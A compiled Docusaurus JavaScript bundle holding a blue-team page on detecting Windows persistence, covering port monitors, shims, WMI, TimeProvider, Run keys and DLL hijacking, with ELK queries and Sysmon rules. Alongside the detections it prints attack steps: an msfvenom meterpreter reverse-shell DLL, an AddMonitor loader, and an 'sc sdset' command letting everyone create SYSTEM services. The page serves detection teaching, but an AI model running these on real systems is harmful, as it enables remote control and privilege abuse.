"use strict";(self.webpackChunktaymaz_docs=self.webpackChunktaymaz_docs||[]).push([[5021],{3905:(e,t,n)=>{n.d(t,{Zo:()=>p,kt:()=>g});var r=n(7294);function a(e,t,n){return t in e?Object.defineProperty(e,t,{value:n,enumerable:!0,configurable:!0,writable:!0}):e[t]=n,e}function i(e,t){var n=Object.keys(e);if(Object.getOwnPropertySymbols){var r=Object.getOwnPropertySymbols(e);t&&(r=r.filter((function(t){return Object.getOwnPropertyDescriptor(e,t).enumerable}))),n.push.apply(n,r)}return n}function o(e){for(var t=1;t<arguments.length;t++){var n=null!=arguments[t]?arguments[t]:{};t%2?i(Object(n),!0).forEach((function(t){a(e,t,n[t])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(n)):i(Object(n)).forEach((function(t){Object.defineProperty(e,t,Object.getOwnPropertyDescriptor(n,t))}))}return e}function l(e,t){if(null==e)return{};var n,r,a=function(e,t){if(null==e)return{};var n,r,a={},i=Object.keys(e);for(r=0;r<i.length;r++)n=i[r],t.indexOf(n)>=0||(a[n]=e[n]);return a}(e,t);if(Object.getOwnPropertySymbols){var i=Object.getOwnPropertySymbols(e);for(r=0;r<i.length;r++)n=i[r],t.indexOf(n)>=0||Object.prototype.propertyIsEnumerable.call(e,n)&&(a[n]=e[n])}return a}var s=r.createContext({}),c=function(e){var t=r.useContext(s),n=t;return e&&(n="function"==typeof e?e(t):o(o({},t),e)),n},p=function(e){var t=c(e.components);return r.createElement(s.Provider,{value:t},e.children)},m="mdxType",d={inlineCode:"code",wrapper:function(e){var t=e.children;return r.createElement(r.Fragment,{},t)}},u=r.forwardRef((function(e,t){var n=e.components,a=e.mdxType,i=e.originalType,s=e.parentName,p=l(e,["components","mdxType","originalType","parentName"]),m=c(n),u=a,g=m["".concat(s,".").concat(u)]||m[u]||d[u]||i;return n?r.createElement(g,o(o({ref:t},p),{},{components:n})):r.createElement(g,o({ref:t},p))}));function g(e,t){var n=arguments,a=t&&t.mdxType;if("string"==typeof e||a){var i=n.length,o=new Array(i);o[0]=u;var l={};for(var s in t)hasOwnProperty.call(t,s)&&(l[s]=t[s]);l.originalType=e,l[m]="string"==typeof e?e:a,o[1]=l;for(var c=2;c<i;c++)o[c]=n[c];return r.createElement.apply(null,o)}return r.createElement.apply(null,n)}u.displayName="MDXCreateElement"},5560:(e,t,n)=>{n.r(t),n.d(t,{assets:()=>s,contentTitle:()=>o,default:()=>d,frontMatter:()=>i,metadata:()=>l,toc:()=>c});var r=n(7462),a=(n(7294),n(3905));const i={},o="Persistent",l={unversionedId:"BT/Detecting Persistent",id:"BT/Detecting Persistent",title:"Persistent",description:"AddMonitor",source:"@site/docs/BT/12- Detecting Persistent.md",sourceDirName:"BT",slug:"/BT/Detecting Persistent",permalink:"/t1/docs/BT/Detecting Persistent",draft:!1,editUrl:"https://github.com/facebook/docusaurus/tree/main/packages/create-docusaurus/templates/shared/docs/BT/12- Detecting Persistent.md",tags:[],version:"current",sidebarPosition:12,frontMatter:{},sidebar:"tutorialSidebar",previous:{title:"Detecting Evasion",permalink:"/t1/docs/BT/Detecting Evasion"},next:{title:"Lateral Movement",permalink:"/t1/docs/BT/Lateral Movement"}},s={},c=[{value:"AddMonitor",id:"addmonitor",level:2},{value:"Detection",id:"detection",level:3},{value:"Hunting Application Shimming",id:"hunting-application-shimming",level:2},{value:"Detection",id:"detection-1",level:3},{value:"Service Control\xa0Manager",id:"service-controlmanager",level:2},{value:"Detection",id:"detection-2",level:3},{value:"Event Log Online\xa0Help",id:"event-log-onlinehelp",level:2},{value:"Detection",id:"detection-3",level:3},{value:"WMI Persistent",id:"wmi-persistent",level:2},{value:"Auditing WMI - Powershell",id:"auditing-wmi---powershell",level:3},{value:"Auditing WMI Sysmon",id:"auditing-wmi-sysmon",level:2},{value:"Other WMI Artifacts",id:"other-wmi-artifacts",level:3},{value:"Auditing WMI with ELK",id:"auditing-wmi-with-elk",level:3},{value:"Remove WMI",id:"remove-wmi",level:3},{value:"Persistent Via TimeProvider",id:"persistent-via-timeprovider",level:2},{value:"Malware Persistent",id:"malware-persistent",level:2},{value:"Auto start  persistent location",id:"auto-start--persistent-location",level:4},{value:"Detction",id:"detction",level:3},{value:"Sysmon Event ID 12,13,14",id:"sysmon-event-id-121314",level:5},{value:"Schedule",id:"schedule",level:4},{value:"DLL Persistent Attack",id:"dll-persistent-attack",level:4}],p={toc:c},m="wrapper";function d(e){let{components:t,...i}=e;return(0,a.kt)(m,(0,r.Z)({},p,i,{components:t,mdxType:"MDXLayout"}),(0,a.kt)("h1",{id:"persistent"},"Persistent"),(0,a.kt)("h2",{id:"addmonitor"},"AddMonitor"),(0,a.kt)("p",null,"The ",(0,a.kt)("strong",{parentName:"p"},"AddMonitor")," function installs a local port monitor and links the configuration, data, and monitor files."),(0,a.kt)("p",null,"Port Monitor refers to the Windows Print Spooler Service or ",(0,a.kt)("inlineCode",{parentName:"p"},"spoolv.exe")," in this post. When adding a printer port monitor, a user (or an attacker) is able to add an arbitrary dll that serves as the ",(0,a.kt)("em",{parentName:"p"},"\u201cmonitor\u201d"),"."),(0,a.kt)("p",null,"There are essentially two ways to add a port monitor, also known as\nyour malicious DLL: through the Registry for persistence or a custom\nWindows application (",(0,a.kt)("inlineCode",{parentName:"p"},"AddMonitor")," function) for immediate dll execution."),(0,a.kt)("p",null,"addMonitor.cpp"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-cpp"},'#include "Windows.h"\n\nint main(int argc, char* argv[]) {\n    MONITOR_INFO_2 monitorInfo;\n    TCHAR env[12] = TEXT("Windows x64");\n    TCHAR name[12] = TEXT("nssMonitor");\n    TCHAR dll[13] = TEXT("nooranet.dll");\n    monitorInfo.pName = name;\n    monitorInfo.pEnvironment = env;\n    monitorInfo.pDLLName = dll;\n    AddMonitor(NULL, 2, (LPBYTE)&monitorInfo);\n    return 0;\n}\n')),(0,a.kt)("p",null,"nooranet.dll"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-bash"},"msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.49 LPORT=443 -f dll > nooranet.dll\n")),(0,a.kt)("h3",{id:"detection"},"Detection"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-bash"},'event.code : "3"  and process.name : "rundll32.exe" \n')),(0,a.kt)("p",null,(0,a.kt)("img",{src:n(1278).Z,width:"2556",height:"1278"})),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-bash"},'event.code : "1"  and  process.parent.name.text : "spoolsv.exe" \n')),(0,a.kt)("p",null,(0,a.kt)("img",{src:n(3591).Z,width:"2548",height:"1282"})),(0,a.kt)("p",null,"Additional information"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-bash"},'reg add "HKLM\\System\\CurrentControlSet\\Control\\Print\\Monitors\\Meow" /v "Driver" /d "nooranet.dll" /t REG_SZ\n')),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-bash"},'reg query "HKLM\\System\\CurrentControlSet\\Control\\Print\\Monitors" /s\n')),(0,a.kt)("h2",{id:"hunting-application-shimming"},"Hunting Application Shimming"),(0,a.kt)("p",null,"The Application compatibility toolkit interface can be used to create a new shim database or modify an existing database."),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-bash"},"sdbinst pentestlab.sdb\n")),(0,a.kt)("h3",{id:"detection-1"},"Detection"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-bash"},"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\Custom\\\nHKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\InstalledSDB\\\n")),(0,a.kt)("h2",{id:"service-controlmanager"},"Service Control\xa0Manager"),(0,a.kt)("p",null,"The service control manager (SCM) is responsible to start and stop  services in windows environments including device drivers and start up  applications"),(0,a.kt)("p",null,"Security Descriptor Definition Language (SDDL) in order to provide a  textual representation for security descriptors in a more readable  format. Prior to Windows 2000 security descriptors were represented as  hex bytes"),(0,a.kt)("p",null,"user service right "),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-bash"},"sc sdshow scmanager\n")),(0,a.kt)("p",null,"The command below will enumerate the permissions of the \u201c",(0,a.kt)("em",{parentName:"p"},"scmanager"),"\u201d utility and will display the associated SDDL rights."),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-bash"},"sc sdshow scmanager showrights\n")),(0,a.kt)("p",null,(0,a.kt)("inlineCode",{parentName:"p"},"Tips")),(0,a.kt)("p",null,"Users with standard level access they cannot create a service in Window  environments. This privilege belongs only to elevated users such as  Local Administrators. However, modification of the security descriptor  permissions for the service control manager could allow also any user to  create a service that will run under the context of the SYSTEM accoun"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-bash"},"sc.exe sdset scmanager D:(A;;KA;;;WD)\n")),(0,a.kt)("table",null,(0,a.kt)("thead",{parentName:"table"},(0,a.kt)("tr",{parentName:"thead"},(0,a.kt)("th",{parentName:"tr",align:null},"D"),(0,a.kt)("th",{parentName:"tr",align:null},"Discretionary Access Control List"))),(0,a.kt)("tbody",{parentName:"table"},(0,a.kt)("tr",{parentName:"tbody"},(0,a.kt)("td",{parentName:"tr",align:null},"A"),(0,a.kt)("td",{parentName:"tr",align:null},"Access Control Entry \u2013 Access Allowed")),(0,a.kt)("tr",{parentName:"tbody"},(0,a.kt)("td",{parentName:"tr",align:null},"KA"),(0,a.kt)("td",{parentName:"tr",align:null},"KEY_ALL_ACCESS \u2013 Rights")),(0,a.kt)("tr",{parentName:"tbody"},(0,a.kt)("td",{parentName:"tr",align:null},"WD"),(0,a.kt)("td",{parentName:"tr",align:null},"Security Principal of Everyone Group")))),(0,a.kt)("p",null,"after change permission everyone can create service "),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-bash"},'sc create nooranet displayName= "nooranet" binPath= "C:\\temp\\nss.exe" start= auto\n')),(0,a.kt)("h3",{id:"detection-2"},"Detection"),(0,a.kt)("p",null,(0,a.kt)("img",{src:n(9434).Z,width:"2866",height:"1436"})),(0,a.kt)("h2",{id:""}),(0,a.kt)("h2",{id:"event-log-onlinehelp"},"Event Log Online\xa0Help"),(0,a.kt)("p",null,"Microsoft in order to assist administrators to retrieve direct information for a particular event ID over the web has embedded a  functionality which is called Event Log Online Help."),(0,a.kt)("p",null,"The Event Log Online Help redirects the users to a Microsoft URL and is controlled from the following registry location."),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-powershell"},'reg query "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Event Viewer" /s\n')),(0,a.kt)("ul",null,(0,a.kt)("li",{parentName:"ul"},(0,a.kt)("p",{parentName:"li"},"MicrosoftRedirectionProgram    REG_EXPAND_SZ")),(0,a.kt)("li",{parentName:"ul"},(0,a.kt)("p",{parentName:"li"},"MicrosoftRedirectionProgramCommandLineParameters    REG_SZ")),(0,a.kt)("li",{parentName:"ul"},(0,a.kt)("p",{parentName:"li"},"MicrosoftRedirectionURL    REG_SZ    ",(0,a.kt)("a",{parentName:"p",href:"http://go.microsoft.com/fwlink/events.asp"},"http://go.microsoft.com/fwlink/events.asp")))),(0,a.kt)("h3",{id:"detection-3"},"Detection"),(0,a.kt)("p",null,(0,a.kt)("img",{src:n(6355).Z,width:"2868",height:"1424"})),(0,a.kt)("h2",{id:"wmi-persistent"},"WMI Persistent"),(0,a.kt)("p",null,"WMI is comprised of a powerful set of tools used to manage Windows systems both locally and remotely .An example of a managed component in WMI would be a running process, registry key, installed service, file information, and so on."),(0,a.kt)("h3",{id:"auditing-wmi---powershell"},"Auditing WMI - Powershell"),(0,a.kt)("p",null,"Event Filter"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-powershell"},"Get-WMIObject -Namespace root\\Subscription -Class __EventFilter\n")),(0,a.kt)("p",null,"Event Consumer "),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-powershell"},"Get-WMIObject -Namespace root\\Subscription -Class __EventConsumer\n")),(0,a.kt)("p",null,"FIlterToConsumer"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-powershell"},"Get-WMIObject -Namespace root\\Subscription -Class __FilterToConsumerBinding\n")),(0,a.kt)("h2",{id:"auditing-wmi-sysmon"},"Auditing WMI Sysmon"),(0,a.kt)("p",null,"WMI EventFilter activity"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-powershell"},"Event ID : 19\n")),(0,a.kt)("p",null,"WMI Event Consumer"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-powershell"},"Eent ID : 20\n")),(0,a.kt)("p",null,"WMI EventConsumerToFilter"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-powershell"},"Event ID : 21\n")),(0,a.kt)("h3",{id:"other-wmi-artifacts"},"Other WMI Artifacts"),(0,a.kt)("p",null,"offline Repository "),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-powershell"},"C:\\Windows\\System32\\wbem\\Repository\n")),(0,a.kt)("p",null,"Event Viewer "),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-powershell"},"wevtutil.exe sl Microsoft-Windows-WMI-Activity/Trace /e:true\n")),(0,a.kt)("h3",{id:"auditing-wmi-with-elk"},"Auditing WMI with ELK"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-powershell"},'process where  process.name : "wmic.exe" and\n  process.args : ("ActiveScriptEventConsumer", "CommandLineEventConsumer")\n')),(0,a.kt)("p",null,"powershell"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-powershell"},'process  where  process.args : ("*instancemodificationonevent*" , "*commandlineeventconsume*" , "*Eventfilter*")\nand ( 10 / process.args_count ) == 1\n')),(0,a.kt)("h3",{id:"remove-wmi"},"Remove WMI"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-powershell"},"Get-WmiObject -Namespace root\\Subscription -Class __EventFilter -Filter \"Name='Nooranet-WMI'\" | Remove-WmiObject -verbose\n")),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-powershell"},"Get-WmiObject -Namespace root\\Subscription -Class CommandLineEventConsumer -Filter \"Name='Nooranet-WMI'\" | Remove-WmiObject -verbose\n")),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-powershell"},"Get-WmiObject -Namespace root\\Subscription -Class __FilterToConsumerBinding -Filter \"__Path LIKE '%Nooranet-WMI%'\" | Remove-WmiObject -verbos\n")),(0,a.kt)("h2",{id:"-1"}),(0,a.kt)("h2",{id:"persistent-via-timeprovider"},"Persistent Via TimeProvider"),(0,a.kt)("p",null,(0,a.kt)("inlineCode",{parentName:"p"},"Sysmon")),(0,a.kt)("ul",null,(0,a.kt)("li",{parentName:"ul"},(0,a.kt)("p",{parentName:"li"},"Create and Delete : 12")),(0,a.kt)("li",{parentName:"ul"},(0,a.kt)("p",{parentName:"li"},"Registry Value Set : 13")),(0,a.kt)("li",{parentName:"ul"},(0,a.kt)("p",{parentName:"li"},"Registry Key and Value Rename : 14"))),(0,a.kt)("p",null,"EQL "),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-EQL"},'registry where event.type:"change" and registry.path : "HKLM\\\\SYSTEM\\\\*ControlSet*\\\\Services\\\\W32Time\\\\TimeProviders\\\\*"\n and registry.data.strings:"*.dll"\nand user.name != "system"\n')),(0,a.kt)("h2",{id:"malware-persistent"},"Malware Persistent"),(0,a.kt)("h4",{id:"auto-start--persistent-location"},"Auto start  persistent location"),(0,a.kt)("ul",null,(0,a.kt)("li",{parentName:"ul"},(0,a.kt)("p",{parentName:"li"},"Ntuser.dat\\software\\Microsoft\\Windows\\Currentversion\\run")),(0,a.kt)("li",{parentName:"ul"},(0,a.kt)("p",{parentName:"li"},"Ntuser.dat\\software\\Microsoft\\Windows\\Currentversion\\runonce")),(0,a.kt)("li",{parentName:"ul"},(0,a.kt)("p",{parentName:"li"},"software\\Microsoft\\Windows\\Currentversion\\run")),(0,a.kt)("li",{parentName:"ul"},(0,a.kt)("p",{parentName:"li"},"software\\Microsoft\\Windows\\Currentversion\\runonce")),(0,a.kt)("li",{parentName:"ul"},(0,a.kt)("p",{parentName:"li"},"software\\Microsoft\\Windows\\currentversion\\policies\\Explorer\\Run"))),(0,a.kt)("h3",{id:"detction"},"Detction"),(0,a.kt)("h5",{id:"sysmon-event-id-121314"},"Sysmon Event ID 12,13,14"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-powershell"},'<Sysmon schemaversion="4.30">\n    <EventFiltering>\n        <RuleGroup name="" groupRelation="or">\n            <RegistryEvent onmatch="include">\n                <TargetObject name="NSS-run" condition="contains">\\CurrentVersion\\Run</TargetObject>                \n            </RegistryEvent>\n        </RuleGroup>\n    </EventFiltering>\n</Sysmon>\n')),(0,a.kt)("p",null,"ELk Detetction "),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-powershell"},'registry where \n registry.path : (\n      "*\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\\\\*",\n      "*\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\RunOnce\\\\*",\n     "*\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\RunOnceEx\\\\*",\n     "*\\\\SOFTWARE\\\\Microsoft\\\\Command Processor\\\\Autorun\\\\*"\n                  )\n')),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-powershell"},'registry where \n registry.data.strings != null and process.name : "WmiPrvSe.exe" and\n registry.path : (\n                  "HKEY_USERS\\\\*\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\\\\*",\n                  "HKLM\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\\\\*",\n                  "HKLM\\\\Software\\\\WOW6432Node\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\\\\*",\n                  "HKEY_USERS\\\\*\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Policies\\\\Explorer\\\\Run\\\\*",\n                  "HKLM\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Policies\\\\Explorer\\\\Run\\\\*",\n                  "HKLM\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\RunOnce\\\\*")\n')),(0,a.kt)("h4",{id:"schedule"},"Schedule"),(0,a.kt)("ul",null,(0,a.kt)("li",{parentName:"ul"},(0,a.kt)("p",{parentName:"li"},"At.exe")),(0,a.kt)("li",{parentName:"ul"},(0,a.kt)("p",{parentName:"li"},"Schtasks.exe"),(0,a.kt)("pre",{parentName:"li"},(0,a.kt)("code",{parentName:"pre",className:"language-powershell"},'CHTASKS /CREATE /SC WEEKLY /D SUN /TN "MyTasks\\Notepad task" /TR\n "C:\\Windows\\System32\\notepad.exe" /ST 11:00\n')))),(0,a.kt)("h4",{id:"-2"}),(0,a.kt)("h4",{id:"dll-persistent-attack"},"DLL Persistent Attack"),(0,a.kt)("ul",null,(0,a.kt)("li",{parentName:"ul"},(0,a.kt)("p",{parentName:"li"},"DLL Search order Hijacking"),(0,a.kt)("ul",{parentName:"li"},(0,a.kt)("li",{parentName:"ul"},(0,a.kt)("p",{parentName:"li"},"Hijacking the search order  takes place by putting the evil DLL in a location that is searched in  before the actual DLL"),(0,a.kt)("div",{dir:"rtl",align:"right"},"\u0642\u0628\u0644 \u0627\u0632 \u0627\u06cc\u0646\u06a9\u0647 \u0641\u0627\u06cc\u0644 \u0647\u0627\u06cc DLL \u0627\u0632 \u0645\u062d\u0644 \u0627\u0635\u0644\u06cc \u0627\u062c\u0631\u0627 \u0634\u0648\u0646\u062f \u0627\u0632 \u0641\u0648\u0644\u062f\u0631\u06cc \u06a9\u0647 \u0646\u0641\u0648\u0630 \u06af\u0631 \u0645\u06cc\u062e\u0648\u0627\u0647\u062f \u062e\u0648\u0627\u0646\u062f\u0647 \u0634\u0648\u062f")))),(0,a.kt)("li",{parentName:"ul"},(0,a.kt)("p",{parentName:"li"},"Phantom DLL Hijacking "),(0,a.kt)("ul",{parentName:"li"},(0,a.kt)("li",{parentName:"ul"},"\xa0 drop an evil DLL in place  of a missing/non-existing DLL that a legitimate application tries to  load")))),(0,a.kt)("div",{dir:"rtl",align:"right"},"\u0628\u0631\u0646\u0627\u0645\u0647 \u0627\u06cc \u0645\u062c\u0627\u0632 \u0631\u0627 \u0645\u062c\u0628\u0648\u0631 \u0628\u0647 \u0628\u0627\u0631 \u06af\u0630\u0627\u0631\u06cc \u0641\u0627\u06cc\u0644 \u0647\u0627\u06cc dll \u0645\u062e\u0631\u0628 \u0645\u06cc\u06a9\u0646\u062f"),(0,a.kt)("ul",null,(0,a.kt)("li",{parentName:"ul"},(0,a.kt)("p",{parentName:"li"},"DLL Side-Loading"),(0,a.kt)("ul",{parentName:"li"},(0,a.kt)("li",{parentName:"ul"},"replace the legitimate DLL  with the evil DLL in the relevant WinSxS folder of the targeted DLL")))),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-powershell"},'(winlog.event_id:"4657" AND winlog.event_data.ProcessName:"C\\:\\\\Windows\\\\System32\\\\services.exe" AND "cmd.exe\\ \\/c" AND "MACHINE\\\\SYSTEM")\n')),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-xquery"},'file where event.type != "deletion" and user.domain != "NT AUTHORITY"\nand \n(file.path : "C:\\\\*\\\\Programs\\\\Startup\\\\*.lnk" and process.name :\n("wscript.exe", "cscript.exe")) or \n file.path :\n("C:\\\\*\\\\Programs\\\\Startup\\\\*.vbs",\n"C:\\\\*\\\\Programs\\\\Startup\\\\*.vbe",\n"C:\\\\*\\\\Programs\\\\Startup\\\\*.wsh",\n"C:\\\\*\\\\Programs\\\\Startup\\\\*.wsf",\n"C:\\\\*\\\\Programs\\\\Startup\\\\*.js")\n')),(0,a.kt)("p",null,"sysmon "),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-bash"},'<Sysmon schemaversion="4.40">\n  <HashAlgorithms>*</HashAlgorithms>\n  <EventFiltering>\n    <RuleGroup name="" groupRelation="or">\n      <ProcessAccess onmatch="include">\n        <CallTrace condition="contains" name="function_name=ProviderExecMethod">C:\\Windows\\SYSTEM32\\framedynos.dll+2b496</CallTrace>\n        <CallTrace condition="contains" name="function_name=CWbemProviderGlueExecMethodAsync">C:\\Windows\\SYSTEM32\\framedynos.dll+2cb3e</CallTrace>\n        <CallTrace condition="contains any" name="function_name=WSHellExec">C:\\Windows\\System32\\wshom.ocx+c8a0;C:\\Windows\\System32\\wshom.ocx+c39d</CallTrace>\n        <CallTrace condition="contains" name="function_name=CSShellExecute_ExecuteAssoc">C:\\Windows\\System32\\SHELL32.dll+9b5bd</CallTrace>\n        <CallTrace condition="contains" name="function_name=CSShellExecute_DoExecute">C:\\Windows\\System32\\SHELL32.dll+ae3b9</CallTrace>\n        <Rule groupRelation="and" name="function_name=CreateProcessW">\n            <SourceImage condition="contains">C:\\Program Files\\Microsoft Office\\Root\\Office16</SourceImage>\n            <CallTrace condition="contains">C:\\Windows\\System32\\KERNELBASE.dll+76516</CallTrace>\n        </Rule>\n        <CallTrace condition="contains" name="function_name=MiniDumpWriteDump">C:\\Windows\\SYSTEM32\\dbgcore.DLL+6cfb</CallTrace>\n        <CallTrace condition="contains" name="function_name=PssCaptureSnapShot">C:\\Windows\\System32\\KernelBase.dll+de67e</CallTrace>\n      </ProcessAccess>\n    </RuleGroup>\n  </EventFiltering>\n</Sysmon>\n')))}d.isMDXComponent=!0},1278:(e,t,n)=>{n.d(t,{Z:()=>r});const r=n.p+"assets/images/addmonitor1-64dfaa4d5164b7e9b09514f21097751d.png"},3591:(e,t,n)=>{n.d(t,{Z:()=>r});const r=n.p+"assets/images/addmonitor2-b6268efe6dbb75c1a537f2198f75f1ac.png"},6355:(e,t,n)=>{n.d(t,{Z:()=>r});const r=n.p+"assets/images/event-4b2b3e2180d3bd388a406db540bae965.png"},9434:(e,t,n)=>{n.d(t,{Z:()=>r});const r=n.p+"assets/images/sc-b5b6b7d80dcd79799b412ba223a21610.png"}}]);